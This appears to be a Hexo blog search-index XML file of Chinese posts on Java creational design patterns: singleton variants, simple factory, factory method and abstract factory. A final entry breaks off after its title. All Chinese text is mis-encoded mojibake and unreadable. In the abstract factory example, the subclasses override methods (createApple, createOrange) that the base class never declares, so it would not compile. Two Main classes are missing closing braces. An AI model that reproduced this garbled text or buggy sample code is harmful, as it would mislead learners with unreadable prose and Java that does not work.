<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>åˆ›å»ºå‹-å•ä¾‹æ¨¡å¼</title>
    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="é¥¿æ±‰å¼"><a href="#é¥¿æ±‰å¼" class="headerlink" title="é¥¿æ±‰å¼"></a>é¥¿æ±‰å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//ç”¨äºå¼•ç”¨å…¨å±€å”¯ä¸€çš„å•ä¾‹å¯¹è±¡ï¼Œåœ¨ä¸€å¼€å§‹å°±åˆ›å»ºå¥½</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//ä¸å…è®¸éšä¾¿new</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">//è·å–å…¨å±€å”¯ä¸€çš„å•ä¾‹å¯¹è±¡</span><br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        System.out.println(instance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="æ‡’æ±‰å¼"><a href="#æ‡’æ±‰å¼" class="headerlink" title="æ‡’æ±‰å¼"></a>æ‡’æ±‰å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">//åœ¨ä¸€å¼€å§‹ä¸åˆ›å»ºå¯¹è±¡</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//å¦‚æœå®ä¾‹ä¸ºç©ºå°±åˆ›å»º</span><br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰ç§ç¼ºé™·ï¼Œç”±äºæ‡’æ±‰å¼åœ¨æ–¹æ³•ä¸­è¿›è¡Œåˆå§‹åŒ–ï¼Œåœ¨å¤šçº¿ç¨‹çš„ç¯å¢ƒä¸‹ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</p>
<h3 id="æ‡’æ±‰å¼-æ”¹è¿›"><a href="#æ‡’æ±‰å¼-æ”¹è¿›" class="headerlink" title="æ‡’æ±‰å¼-æ”¹è¿›"></a>æ‡’æ±‰å¼-æ”¹è¿›</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ç§æ•ˆç‡æ¯”è¾ƒä½ï¼Œåªèƒ½åˆä¸€ä¸ªçº¿ç¨‹èƒ½è¿›å…¥åŒæ­¥å—ï¼Œå…¶ä»–çš„å¿…é¡»è¦ç­‰å¾…</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//åŒé‡æ£€æŸ¥</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åŒé‡æ£€æŸ¥å¯ä»¥ç¡®ä¿åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¹Ÿèƒ½ä¿æŒå•ä¾‹çš„å”¯ä¸€æ€§ï¼ŒåŒæ—¶å°½å¯èƒ½åœ°å‡å°‘äº†åŒæ­¥çš„å¼€é”€ã€‚</p>
<h3 id="JAVAç‰¹æœ‰çš„å†™æ³•"><a href="#JAVAç‰¹æœ‰çš„å†™æ³•" class="headerlink" title="JAVAç‰¹æœ‰çš„å†™æ³•"></a>JAVAç‰¹æœ‰çš„å†™æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <span class="hljs-comment">//ç”±é™æ€å†…éƒ¨ç±»æŒæœ‰å•ä¾‹å¯¹è±¡ï¼Œæ ¹æ®ç±»åŠ è½½çš„ç‰¹æ€§ï¼Œä»…ä½¿ç”¨Singletonç±»æ—¶ï¼Œä¸ä¼šå¯¹é™æ€å†…éƒ¨ç±»è¿›è¡Œåˆå§‹åŒ–</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//åªæœ‰çœŸæ­£ä½¿ç”¨å†…éƒ¨ç±»æ—¶ï¼Œæ‰ä¼šè¿›è¡Œç±»åˆå§‹åŒ–</span><br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨Javaä¸­ï¼Œé™æ€å†…éƒ¨ç±»åœ¨è¢«ä½¿ç”¨ä¹‹å‰æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œè¿™æ˜¯ç”±ç±»åŠ è½½å™¨çš„å·¥ä½œåŸç†å†³å®šçš„ã€‚</p>
<p>å½“ç¨‹åºç¬¬ä¸€æ¬¡è®¿é—®é™æ€å†…éƒ¨ç±» <code>SingletonHolder</code> æ—¶ï¼ŒJVM ä¼šåŠ è½½ <code>SingletonHolder</code> ç±»ã€‚è¿™ä¸ªåŠ è½½è¿‡ç¨‹æ˜¯å»¶è¿Ÿçš„ï¼Œåªæœ‰åœ¨çœŸæ­£éœ€è¦ä½¿ç”¨ <code>SingletonHolder</code> ç±»æ—¶æ‰ä¼šè§¦å‘ã€‚æ‰€ä»¥ï¼Œå³ä½¿ <code>Singleton</code> ç±»è¢«åŠ è½½äº†ï¼Œä½†æ˜¯ä¸ä¼šå¯¼è‡´ <code>SingletonHolder</code> ç±»è¢«åŠ è½½ï¼Œä¹Ÿå°±ä¸ä¼šåˆ›å»ºå•ä¾‹å¯¹è±¡ã€‚</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ›å»ºå‹-å·¥å‚æ¨¡å¼</title>
    <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>â€‹	ä¸ºäº†å†™å‡ºæ›´â€œä¼˜é›…â€çš„ä»£ç ï¼Œé‚å‡†å¤‡æ¥å­¦ä¹ JAVAçš„è®¾è®¡æ¨¡å¼ã€‚</p>
<p>â€‹	ä»¥å‰ä»æ¥æ²¡æœ‰å†™æ–‡ç« çš„ä¹ æƒ¯ï¼Œå‘ç°å­¦è¿‡çš„ä¸œè¥¿å®¹æ˜“å¿˜è®°ï¼Œä¹Ÿå¯èƒ½æ˜¯å­¦çš„è¿‡äºè¡¨é¢ï¼Œä¸å¤Ÿæ·±å…¥ï¼Œäº†è§£äº†è´¹æ›¼å­¦ä¹ æ³•ï¼Œå†³å®šå¼€å§‹ç æ–‡ç« ï¼Œå½“ä½œå­¦ä¹ è®°å½•å§ï¼Œä¹Ÿæ–¹ä¾¿å›é¡¾ã€‚</p>
<h2 id="è®¾è®¡æ¨¡å¼"><a href="#è®¾è®¡æ¨¡å¼" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a>è®¾è®¡æ¨¡å¼</h2><p>â€‹	JAVAçš„è®¾è®¡æ¨¡å¼åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ›å»ºå‹æ¨¡å¼ï¼ˆå…³æ³¨å¯¹è±¡çš„åˆ›å»ºæœºåˆ¶ï¼‰ã€ç»“æ„æ€§æ¨¡å¼ï¼ˆå…³æ³¨ç±»å’Œå¯¹è±¡ä¹‹é—´çš„ç»„åˆï¼‰ã€è¡Œä¸ºå‹æ¨¡å¼ï¼ˆå…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ä»¥åŠè´£ä»»çš„åˆ†é…ï¼‰</p>
<h2 id="ç®€å•å·¥å‚æ¨¡å¼"><a href="#ç®€å•å·¥å‚æ¨¡å¼" class="headerlink" title="ç®€å•å·¥å‚æ¨¡å¼"></a>ç®€å•å·¥å‚æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœæŠ½è±¡ç±»</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//ç»§æ‰¿æ°´æœ</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;è‹¹æœ&quot;</span>);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123;	<span class="hljs-comment">//ç»§æ‰¿æ°´æœ</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;æ©˜å­&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimplefruitFactory</span> &#123; <span class="hljs-comment">//æ°´æœå·¥å‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Fruit <span class="hljs-title function_">getFruit</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (type) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;è‹¹æœ&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ©˜å­&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// å¤„ç†æœªçŸ¥ç±»å‹</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> SimplefruitFactory.getFruit(<span class="hljs-string">&quot;æ©˜å­&quot;</span>); <span class="hljs-comment">//é€šè¿‡å·¥å‚åˆ›å»º</span><br>        System.out.println(fruit);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>â€‹	è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œæ¯”å¦‚Appleçš„æ„é€ æ–¹æ³•éœ€è¦æ–°çš„å‚æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹å·¥å‚é‡Œé¢çš„å‚æ•°ï¼Œå› ä¸ºå…¶ä»–åœ°æ–¹æ˜¯é€šè¿‡å·¥å‚è·å¾—çš„æ°´æœçš„å®ä¾‹ã€‚</p>
<p>å‡å¦‚ç°åœ¨éœ€è¦å¢åŠ ä¸€ä¸ªæ–°çš„æ°´æœç±»å‹ï¼Œå°±éœ€è¦å¯¹å·¥å‚è¿›è¡Œä¿®æ”¹ã€‚è¿™ä¸ç¬¦åˆå¼€é—­åŸåˆ™ã€‚ï¼ˆå¼€é—­åŸåˆ™ï¼šä¸€ä¸ªè½¯ä»¶å®ä½“ï¼Œæ¯”å¦‚ç±»ã€æ¨¡å—å’Œå‡½æ•°åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ï¼‰ã€‚</p>
<h2 id="å·¥å‚æ¨¡å¼"><a href="#å·¥å‚æ¨¡å¼" class="headerlink" title="å·¥å‚æ¨¡å¼"></a>å·¥å‚æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FruitFactory</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span>&gt;&#123; <span class="hljs-comment">//å°†æ°´æœå·¥å‚æŠ½è±¡ä¸ºæŠ½è±¡ç±»ï¼Œé€šè¿‡æ³›å‹æŒ‡å®šæ°´æœç±»å‹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span>;  <span class="hljs-comment">//ä¸åŒçš„æ°´æœå·¥å‚ï¼Œç”Ÿäº§ä¸åŒçš„æ°´æœ</span><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactora</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FruitFactory</span>&lt;Apple&gt;&#123; <span class="hljs-comment">//å‡å¦‚éœ€è¦è‹¹æœå°±åˆ›å»ºä¸€ä¸ªè‹¹æœå·¥å‚ç±»ï¼Œæ–°å¢æ©˜å­ï¼Œè“è“ï¼Œç­‰ç­‰åŒç†</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Apple <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Apple</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactora</span>().getFruit();<br>        System.out.println(fruit);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>â€‹	å±è”½äº†å¯¹è±¡çš„åˆ›å»ºç»†èŠ‚ï¼Œä½¿ç”¨è€…åªéœ€è¦å…³å¿ƒå¦‚ä½•ä½¿ç”¨å¯¹è±¡ï¼Œé™ä½äº†å®¢æˆ·ç«¯ä¸å¯¹è±¡ä¹‹é—´çš„è€¦åˆåº¦ã€‚</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ›å»ºå‹-æŠ½è±¡å·¥å‚æ¨¡å¼</title>
    <url>/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>â€‹	å·¥å‚æ¨¡å¼å…³æ³¨äºåˆ›å»ºå•ä¸ªå¯¹è±¡ï¼Œé€šè¿‡ä¸€ä¸ªå·¥å‚ç±»æ¥å®ç°ã€‚ä½†æ˜¯å‡å¦‚é‡åˆ°éœ€è¦åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–çš„å¯¹è±¡çš„æ—¶å€™ï¼Œå°±æœ‰äº›ä¹åŠ›äº†ï¼Œè€ŒæŠ½è±¡å·¥å‚æ¨¡å¼èƒ½å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h2 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœæŠ½è±¡ç±»</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœå®ç°ç±»</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;è‹¹æœ&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœå®ç°ç±»</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;æ©˜å­&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;  <span class="hljs-comment">//æŠ½è±¡æ°´æœå·¥å‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getApple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getOrange</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// åœ¨è‹¹æœå·¥å‚ä¸­ä¸åˆ›å»ºæ©˜å­</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrangeFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// åœ¨æ©˜å­å·¥å‚ä¸­ä¸åˆ›å»ºè‹¹æœ</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">appleFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> appleFactory.createApple();<br>        System.out.println(apple);<br><br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">orangeFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrangeFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">orange</span> <span class="hljs-operator">=</span> orangeFactory.createOrange();<br>        System.out.println(orange);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«"><a href="#å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«" class="headerlink" title="å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«"></a>å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«</h2><p>â€‹	<strong>å·¥å‚æ¨¡å¼å…³æ³¨äºåˆ›å»ºå•ä¸ªå¯¹è±¡ï¼Œé€šå¸¸æ˜¯é€šè¿‡ä¸€ä¸ªå·¥å‚ç±»æ¥å®ç°ã€‚</strong></p>
<p>â€‹	<strong>å·¥å‚æ¨¡å¼é€‚ç”¨äºåˆ›å»ºå•ä¸ªå¯¹è±¡çš„åœºæ™¯ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼é€‚ç”¨äºéœ€è¦åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³å¯¹è±¡çš„åœºæ™¯ã€‚</strong></p>
<p>â€‹	<strong>æŠ½è±¡å·¥å‚æ¨¡å¼åˆ™æ›´åŠ å°é—­ï¼Œå› ä¸ºå®ƒéœ€è¦ä¸€æ¬¡æ€§å®šä¹‰æ‰€æœ‰äº§å“æ—çš„åˆ›å»ºæ–¹æ³•ã€‚</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ›å»ºå‹-å»ºé€ è€…æ¨¡å¼</title>
    <url>/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
